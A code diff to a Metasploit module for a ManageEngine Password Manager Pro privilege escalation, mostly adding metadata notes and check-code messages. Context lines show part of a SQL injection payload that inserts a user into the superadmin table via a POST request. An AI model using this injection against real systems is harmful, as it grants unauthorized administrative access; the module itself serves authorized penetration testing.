@@ -34,7 +34,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/18' ],
           [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt' ],
         ],
-        'DisclosureDate' => '2014-11-08'
+        'DisclosureDate' => '2014-11-08',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
@@ -170,7 +175,7 @@ class MetasploitModule < Msf::Auxiliary
       "insert into ptrx_superadmin values (#{user_id},true);"
     sqli_suffix = '-- '
 
-    res = send_request_cgi({
+    send_request_cgi({
       'method' => 'POST',
       'uri' => normalize_uri(target_uri.path, 'SQLAdvancedALSearchResult.cc'),
       'cookie' => @cookie,
@@ -206,11 +211,11 @@ class MetasploitModule < Msf::Auxiliary
     version = get_version
     case version
     when 0..7104
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("ManageEngine PMP build #{version} is in the vulnerable range")
     when 7105..9998
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe("ManageEngine PMP build #{version} is patched")
     else
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown("ManageEngine PMP build #{version} could not be assessed")
     end
   end
 
